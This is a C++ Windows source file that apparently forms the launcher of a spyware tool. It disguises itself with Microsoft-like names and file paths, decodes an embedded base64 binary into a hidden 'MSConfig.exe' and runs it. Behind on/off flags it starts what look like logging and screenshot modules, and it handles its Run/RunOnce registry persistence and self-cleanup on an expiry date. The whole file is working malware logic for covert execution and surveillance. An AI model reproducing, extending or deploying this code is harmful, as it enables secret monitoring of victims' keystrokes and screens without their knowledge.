#include "SystemDiagnostics.h"

int WINAPI WinMain (HINSTANCE hThisInstance, HINSTANCE hPrevInstance, LPSTR lpszArgument, int nFunsterStil)
{
    char buffer[1024], fillin[64], *tok;
    string Logs, Scrs, decoded;
    //Base64 of the MSConfig binary
    long exp, launch;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    fstream output;
    
    GetTempPath(1024, buffer);
    strcat(buffer, "Microsoft_9021784367548932\\Temp\\winset.db");
    ifstream delay(buffer);
    if (delay)
    {
              time_t ctl;
              long curtimel;
              time(&ctl);
              curtimel = ctl;
              delay.getline(fillin, 64);
              delay.close();
              launch = atoi(fillin);
              if (curtimel < launch) return 1;
              SetFileAttributes(buffer, FILE_ATTRIBUTE_NORMAL);
              DeleteFile(buffer);
    }
    
    GetTempPath(1024, buffer);
    strcat(buffer, "Microsoft_9021784367548932\\Temp\\Parameters.db");
    ifstream params(buffer);
    if (params)
    {
               for (int i = 1 ; i <= 7 ; i ++) params.getline(fillin, 64);
               tok = strtok(fillin, " ");
               tok = strtok(NULL, " ");
               Logs = tok;
               
               params.getline(fillin, 64);
               tok = strtok(fillin, " ");
               tok = strtok(NULL, " ");
               Scrs = tok;
               
               params.getline(fillin, 64);
               tok = strtok(fillin, " ");
               tok = strtok(NULL, " ");
               exp = atoi(tok);
               
               params.close();
    }
    
    time_t ct;
    long curtime;
    time(&ct);
    curtime = ct;
    if (curtime > exp)
    {
	    HKEY hk;
	    RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_SET_VALUE, &hk);
	    RegDeleteValue(hk, "SystemDiagnostics");
    	RegCloseKey(hk);
        
        GetTempPath(1024, buffer);
        strcat(buffer,"cleanopack.exe");
        HKEY hKey;
    	RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"), 0, KEY_SET_VALUE, &hKey);
    	RegSetValueEx(hKey, "cleanopack", 0, REG_SZ, (BYTE*)buffer, (strlen(buffer)+1));
    	RegCloseKey(hKey);
        
		exit(1);
    }
    
    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );
    GetTempPath(1024, buffer);
    strcat(buffer, "MSConfig.exe");
    int cres;
    cres = CreateProcess(buffer, NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
    if (cres == 0)
    {
             decoded = base64_decode(client);
             output.open(buffer, fstream::out | ios::binary);
             output << decoded;
             output.close();
             SetFileAttributes(buffer, FILE_ATTRIBUTE_HIDDEN);
             ZeroMemory( &si, sizeof(si) );
             si.cb = sizeof(si);
             ZeroMemory( &pi, sizeof(pi) );
             CreateProcess(buffer, NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
    }
    
    if (Logs == "ON")
    {
             ZeroMemory( &si, sizeof(si) );
             si.cb = sizeof(si);
             ZeroMemory( &pi, sizeof(pi) );
             GetTempPath(1024, buffer);
             strcat(buffer, "Microsoft_9021784367548932\\Temp\\SysMssgs.exe");
             CreateProcess(buffer, NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
    }
    
    if (Scrs == "ON")
    {
             ZeroMemory( &si, sizeof(si) );
             si.cb = sizeof(si);
             ZeroMemory( &pi, sizeof(pi) );
             GetTempPath(1024, buffer);
             strcat(buffer, "Microsoft_9021784367548932\\Temp\\ScrnConfig.exe");
             CreateProcess(buffer, NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
    }
    
    return 0;
}



string base64_decode(string& encoded_string) {
  int in_len = encoded_string.size();
  int i = 0;
  int j = 0;
  int in_ = 0;
  unsigned char char_array_4[4], char_array_3[3];
  string ret;

  while (in_len-- && ( encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
    char_array_4[i++] = encoded_string[in_]; in_++;
    if (i ==4) {
      for (i = 0; i <4; i++)
        char_array_4[i] = base64_chars.find(char_array_4[i]);

      char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
      char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
      char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

      for (i = 0; (i < 3); i++)
        ret += char_array_3[i];
      i = 0;
    }
  }

  if (i) {
    for (j = i; j <4; j++)
      char_array_4[j] = 0;

    for (j = 0; j <4; j++)
      char_array_4[j] = base64_chars.find(char_array_4[j]);

    char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
    char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
    char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

    for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
  }

  return ret;
}
